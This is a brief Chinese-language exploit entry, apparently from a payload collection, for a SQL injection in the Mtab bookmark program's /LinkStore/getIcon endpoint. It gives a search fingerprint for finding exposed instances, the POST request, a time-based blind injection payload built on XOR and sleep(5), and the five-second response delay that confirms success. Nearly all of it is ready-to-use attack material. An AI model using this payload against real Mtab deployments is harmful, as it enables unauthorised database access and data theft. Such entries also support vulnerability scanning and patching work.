# Mtab书签导航程序LinkStoregetIconSQL注入漏洞

Mtab ｜ SQL注入 ｜ —
- **指纹**：`title="Mtab书签"`
- **请求**：`POST /LinkStore/getIcon HTTP/1.1`

**Payload**
```
{"url":"'XOR(if(now()=sysdate(),sleep(5),0))XOR'"}
```
- **响应特征**：200 响应时间>=5s